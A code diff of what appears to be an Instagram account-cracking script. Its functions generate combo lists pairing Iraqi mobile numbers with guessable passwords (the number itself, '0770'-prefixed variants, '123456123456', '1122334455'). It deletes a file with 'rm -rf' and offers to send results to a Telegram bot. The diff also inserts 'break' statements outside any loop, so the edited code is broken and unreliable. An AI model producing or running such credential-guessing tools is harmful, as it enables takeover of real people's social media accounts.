@@ -142,6 +142,7 @@ def instagram1():
 	iiiii=input(" halbzhera: ")
 	def i():
 		combo=input(" [PATH] File >>> ")
+		break
 	def ii():
 		os.system("rm -rf combo.txt")
 		for lowdl in range(5000):
@@ -151,7 +152,7 @@ def instagram1():
 			print("+964770"+str(r)+":"+str(r))
 			print("+964750"+str(rr)+":"+str(rr))
 			sys.stdout.flush()
-		pass
+		break
 	def iii():
 		os.system("rm -rf combo.txt")
 		for loldl in range(5000):
@@ -161,7 +162,7 @@ def instagram1():
 			print("+964770"+str(r)+":0770"+str(r))
 			print("+964750"+str(rr)+":0750"+str(rr))
 			sys.stdout.flush()
-		pass
+		break
 	def iiii():
 		os.system("rm -rf combo.txt")
 		for lossll in range(1000):
@@ -179,7 +180,7 @@ def instagram1():
 			print("+964750"+str(rrrrr)+":123456123456")
 			print("+964750"+str(rrrrrr)+":1122334455")
 			sys.stdout.flush()
-		pass
+		break
 	if iiiii=="1":
 		i()
 		pass
@@ -197,7 +198,6 @@ def instagram1():
 	else:
 		instagram1()
 	import os, sys
-	sys.stdout.flush()
 	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
 	agar=input(wd+"   You Want To Bot TELEGRAM Your Results (y,yes or n,no)")
 	if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
